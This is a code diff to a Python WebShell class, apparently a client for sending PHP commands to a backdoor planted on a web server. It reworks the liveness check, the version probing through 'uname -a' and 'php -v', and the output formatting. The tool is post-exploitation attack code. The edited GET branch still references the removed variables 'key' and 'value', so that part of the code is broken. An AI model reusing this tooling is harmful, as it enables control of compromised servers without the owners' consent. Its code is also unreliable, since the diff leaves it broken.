@@ -37,11 +37,11 @@ class WebShell():
 
     def get_php_version(self):
         if self.php_version != "":
-            Log.success("PHP Version : \n\t%s" % (self.php_version))
+            # Log.success("PHP Version : \n\t%s" % (self.php_version))
             return self.php_version
         result = self.auto_exec("php -v")
         if result[0]:
-            Log.success("PHP Version : \n\t%s" % (result[1][0:-1]))
+            # Log.success("PHP Version : \n\t%s" % (result[1][0:-1]))
             return result[1][0:-1]
         else:
             Log.error("Error occured while getting php version! %s" % result[1])
@@ -49,11 +49,11 @@ class WebShell():
 
     def get_kernel_version(self):
         if self.kernel_version != "":
-            Log.success("Kernel Version : \n\t%s" % (self.kernel_version))
+            # Log.success("Kernel Version : \n\t%s" % (self.kernel_version))
             return self.kernel_version
         result = self.auto_exec("uname -a")
         if result[0]:
-            Log.success("Kernel Version : \n\t%s" % (result[1][0:-1]))
+            # Log.success("Kernel Version : \n\t%s" % (result[1][0:-1]))
             return result[1][0:-1]
         else:
             Log.error("Error occured while getting kernel version! %s" % result[1])
@@ -204,19 +204,18 @@ class WebShell():
 
     def check_working(self, url, method, auth):
         Log.info("Checking whether the webshell is still work...")
-        key = random_string(6, string.letters)
-        value = random_string(32, string.letters)
+        flag = random_string(32, string.letters)
         token = random_string(32, string.letters)
-        Log.info("Using challenge key : [%s] , value : [%s]" % (key, value))
+        Log.info("Using challenge flag : [%s]" % (flag))
         Log.info("Using token : [%s]" % (token))
         method = string.upper(method)
         if method == "POST" or method == "REQUEST":
             Log.info("Using POST method...")
-            data = {auth:'echo "'+token+'";var_dump("$_POST['+key+']");echo "'+token+'";', key:value}
+            data = {auth:'echo "'+token+'";echo "'+flag+'";echo "'+token+'";'}
             response = requests.post(url, data=data)
         elif method == "GET":
             Log.info("Using GET method...")
-            params = {auth:'echo "'+token+'";var_dump("$_POST['+key+']");echo "'+token+'";'}
+            params = {auth:'echo "'+token+'";echo "'+flag+'";echo "'+token+'";'}
             url = build_url(url, params)
             data = {key:value}
             response = requests.post(url, data=data)
@@ -224,8 +223,11 @@ class WebShell():
             Log.error("Unsupported method!")
             return False
         content = response.content
-        Log.success("The content is :\n " + content)
-        return value in content
+        # Log.success("The content is :\n " + content)
+        for i in content.split(token):
+            if i == flag:
+                return True
+        return False
 
     def check_connection(self, url):
         Log.info("Checking the connection to the webshell...")
@@ -313,9 +315,9 @@ class WebShell():
     def auto_exec_print(self, command):
         result = self.auto_exec(command)
         if result[0]:
-            Log.success("Result : \n%s" % result[1][0:-1])
+            Log.success("Result : \n%s" % (repr(result[1][0:-1])).replace("\\n", "\n")[2:-1])
         else:
-            Log.error("Error occured! %s" % result[1][0:-1])
+            Log.error("Error occured! %s" % (repr(result[1][0:-1])).replace("\\n", "\n")[2:-1])
 
 
     def auto_exec(self, command):
